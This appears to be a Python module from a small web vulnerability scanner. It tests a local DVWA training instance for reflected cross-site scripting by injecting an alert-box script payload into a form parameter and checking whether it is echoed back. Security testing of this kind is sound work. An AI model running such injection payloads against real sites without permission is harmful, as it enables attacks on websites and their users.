import requests
from Helpers import helper_dvwa
from Helpers import helper_generic_tags
from Attack import base_attack

BASE_URL = "http://127.0.0.1:80/DVWA"
SCRIPT = "<script>alert('XSS')</script>"
INJECT_DATA = {"name": SCRIPT, "submit": "Submit"}
COOKIES_JSON = {
    "PHPSESSID": helper_dvwa.DVWA.get_user_token(f"{BASE_URL}/login.php"),
    "security": "low"
}


class XSS(base_attack.Attack):
    def __init__(self, url):
        super().__init__(url)

    @staticmethod
    def pass_login_page(session, url):
        session.cookies.update(COOKIES_JSON)
        return session.get(f"{url}/index.php")

    @staticmethod
    def enter_xss_reflected_page(session, url):
        return session.get(f"{url}/vulnerabilities/xss_r/")

    @staticmethod
    def insert_data_and_check_script(session, url):
        res = session.get(f"{url}/vulnerabilities/xss_r/", params=INJECT_DATA)
        return SCRIPT in res.text

    def scan(self):
        with requests.Session() as sess:
            self.pass_login_page(sess, self.url)
            xss_r_page = self.enter_xss_reflected_page(sess, self.url)
            ls_forms = helper_generic_tags.GetGenericTags.get_tags(xss_r_page.text, "form", {})
            if self.insert_data_and_check_script(sess, self.url):
                print("Your website is vulnerable to XSS Injection attack!")
            else:
                print("Your website is NOT vulnerable to XSS Injection attack.")


# def main():
#     xssAttack = XSS(BASE_URL)
#     XSS.scan(xssAttack)
#
#
# if __name__ == "__main__":
#     main()
